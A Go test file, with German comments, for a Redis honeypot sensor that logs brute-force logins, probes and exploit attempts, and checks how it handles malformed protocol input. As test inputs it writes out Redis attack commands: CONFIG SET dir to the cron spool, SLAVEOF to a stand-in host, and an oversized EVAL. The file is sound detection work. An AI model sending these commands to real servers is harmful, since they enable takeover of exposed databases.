package honeypot

import (
	"errors"
	"io"
	"net"
	"os"
	"strconv"
	"strings"
	"testing"
	"time"
)

// redisTestCmd kodiert einen Befehl als RESP-Array.
func redisTestCmd(args ...string) string {
	var b strings.Builder
	b.WriteString("*" + strconv.Itoa(len(args)) + "\r\n")
	for _, a := range args {
		b.WriteString("$" + strconv.Itoa(len(a)) + "\r\n" + a + "\r\n")
	}
	return b.String()
}

// redisTestSay schickt raw und wartet auf want.
func redisTestSay(t *testing.T, c net.Conn, raw, want string) {
	t.Helper()
	if _, err := io.WriteString(c, raw); err != nil {
		t.Fatal(err)
	}
	sensorReadUntil(t, c, want)
}

func TestSensorRedis(t *testing.T) {
	sensorPlainNoDelay(t)
	p := sensorFreePort(t)
	s, rec := sensorStart(t, Config{Services: []Service{{SvcRedis, p, ""}}})

	c := tdsTestDial(t, p)
	redisTestSay(t, c, redisTestCmd("PING"), "+PONG\r\n")
	redisTestSay(t, c, redisTestCmd("ping", "hallo"), "$5\r\nhallo\r\n")
	redisTestSay(t, c, redisTestCmd("INFO"), sensorRedisNoAuth)
	redisTestSay(t, c, "keys *\r\n", sensorRedisNoAuth) // inline
	redisTestSay(t, c, redisTestCmd("AUTH"), "-ERR wrong number of arguments for 'auth' command\r\n")

	redisTestSay(t, c, redisTestCmd("AUTH", "foobared"), sensorRedisWrongPwd)
	e := rec.wait(t, sensorKind(KindDBBrute))
	if e.Service != SvcRedis || e.Port != p || e.Username != "" || e.Password != "foobared" || e.Detail != "auth" {
		t.Fatalf("AUTH: %+v", e)
	}
	redisTestSay(t, c, "AUTH admin geheim\r\n", sensorRedisWrongPwd)
	rec.wait(t, func(e Event) bool { return e.Kind == KindDBBrute && e.Username == "admin" && e.Password == "geheim" })
	redisTestSay(t, c, redisTestCmd("HELLO", "3"), "-NOAUTH HELLO must be called")
	redisTestSay(t, c, redisTestCmd("HELLO", "9"), "-NOPROTO ")
	redisTestSay(t, c, redisTestCmd("HELLO", "3", "AUTH", "default"), "-ERR Syntax error in HELLO option 'auth'")
	redisTestSay(t, c, redisTestCmd("HELLO", "3", "AUTH", "default", "pass word", "SETNAME", "bot"), sensorRedisWrongPwd)
	e = rec.wait(t, func(e Event) bool { return e.Kind == KindDBBrute && e.Detail == "hello" })
	if e.Username != "default" || e.Password != "pass word" || e.Client != "bot" {
		t.Fatalf("HELLO: %+v", e)
	}

	// Konfiguration aendern: db:exploit, Antwort NOAUTH
	redisTestSay(t, c, redisTestCmd("config", "set", "dir", "/var/spool/cron/"), sensorRedisNoAuth)
	e = rec.wait(t, sensorKind(KindDBExploit))
	if e.Detail != "CONFIG SET" || string(e.Payload) != "config set dir /var/spool/cron/" || e.Client != "bot" {
		t.Fatalf("CONFIG: %+v", e)
	}
	redisTestSay(t, c, "SLAVEOF 203.0.113.5 21000\r\n", sensorRedisNoAuth)
	rec.wait(t, func(e Event) bool {
		return e.Kind == KindDBExploit && e.Detail == "SLAVEOF" && string(e.Payload) == "SLAVEOF 203.0.113.5 21000"
	})
	redisTestSay(t, c, redisTestCmd("EVAL", strings.Repeat("x", 2000), "0"), sensorRedisNoAuth)
	e = rec.wait(t, func(e Event) bool { return e.Kind == KindDBExploit && e.Detail == "EVAL" })
	if len(e.Payload) != MaxPayload {
		t.Fatalf("Payload %d", len(e.Payload))
	}
	redisTestSay(t, c, redisTestCmd("QUIT"), "+OK\r\n")
	sensorPlainClosed(t, c)
	if s.counters.Logins.Load() != 3 {
		t.Fatalf("Logins = %d", s.counters.Logins.Load())
	}
	if rec.count(sensorKind(KindProbe)) != 0 {
		t.Fatal("Probe trotz Anmeldung")
	}

	// nur INFO: Probe mit Befehlen und erstem Befehl als Payload
	c2 := tdsTestDial(t, p)
	redisTestSay(t, c2, "INFO server\r\n", sensorRedisNoAuth)
	redisTestSay(t, c2, redisTestCmd("CLIENT", "SETNAME", "scan"), sensorRedisNoAuth)
	c2.Close()
	e = rec.wait(t, sensorKind(KindProbe))
	if e.Detail != "INFO CLIENT" || string(e.Payload) != "INFO server" || e.Client != "scan" {
		t.Fatalf("Probe: %+v", e)
	}
}

func TestSensorRedisLimits(t *testing.T) {
	sensorPlainNoDelay(t)
	p := sensorFreePort(t)
	_, rec := sensorStart(t, Config{Services: []Service{{SvcRedis, p, ""}}})

	// Befehlsgrenze: genau sensorRedisCmds Befehle, dann getrennt
	c := tdsTestDial(t, p)
	_, _ = io.WriteString(c, strings.Repeat(redisTestCmd("PING"), sensorRedisCmds))
	if out := sensorPlainClosed(t, c); strings.Count(out, "+PONG") != sensorRedisCmds {
		t.Fatalf("Befehle: %d", strings.Count(out, "+PONG"))
	}

	// kaputte Laengen: Protokollfehler und Trennung, keine Anmeldung
	cases := []struct{ raw, want string }{
		{"*99999\r\n", "-ERR Protocol error: invalid multibulk length\r\n"},
		{"*x\r\n", "-ERR Protocol error: invalid multibulk length\r\n"},
		{"*1\r\n$-5\r\n", "-ERR Protocol error: invalid bulk length\r\n"},
		{"*1\r\n$99999999999999999999\r\n", "-ERR Protocol error: invalid bulk length\r\n"},
		{"*1\r\n$" + strconv.Itoa(sensorRedisBulkMax+1) + "\r\n", "-ERR Protocol error: invalid bulk length\r\n"},
		{"*2\r\n$4\r\nAUTH\r\n:1\r\n", "-ERR Protocol error: expected '$', got ':'\r\n"},
	}
	for _, tc := range cases {
		c := tdsTestDial(t, p)
		_, _ = io.WriteString(c, tc.raw)
		if out := sensorPlainClosed(t, c); out != tc.want {
			t.Fatalf("%q: %q", tc.raw, out)
		}
	}

	// grosses Argument (angekuendigt 1 MB, Budget reicht nicht): ohne Antwort getrennt
	c3 := tdsTestDial(t, p)
	_, _ = io.WriteString(c3, "*2\r\n$4\r\nAUTH\r\n$"+strconv.Itoa(sensorRedisBulkMax)+"\r\n")
	go func() { _, _ = c3.Write(make([]byte, 128<<10)) }()
	_ = c3.SetReadDeadline(time.Now().Add(5 * time.Second))
	if out, err := io.ReadAll(c3); len(out) != 0 || err != nil && errors.Is(err, os.ErrDeadlineExceeded) {
		t.Fatalf("nicht getrennt: %q %v", out, err) // Trennung per FIN oder RST (ungelesene Daten) ist beides recht
	}

	// ueberlange Inline-Zeile, Muell, abgebrochener Befehl
	c4 := tdsTestDial(t, p)
	redisTestSay(t, c4, "AUTH "+strings.Repeat("y", 5000)+"\r\n", sensorRedisWrongPwd)
	e := rec.wait(t, sensorKind(KindDBBrute))
	if len(e.Password) != MaxText { // Zeile auf sensorPlainLine, Feld auf MaxText
		t.Fatalf("Zeile nicht begrenzt: %d", len(e.Password))
	}
	c5 := tdsTestDial(t, p)
	redisTestSay(t, c5, "\x16\x03\x01\x00\xff\r\n", sensorRedisNoAuth)
	_, _ = io.WriteString(c5, "*3\r\n$3\r\nSET\r\n")
	_ = c5.(*net.TCPConn).CloseWrite()
	sensorPlainClosed(t, c5)
	rec.wait(t, func(e Event) bool { return e.Kind == KindProbe && strings.HasPrefix(string(e.Payload), "\x16\x03") })
	if n := rec.count(sensorKind(KindDBBrute)); n != 1 {
		t.Fatalf("Anmeldungen: %d", n)
	}
}
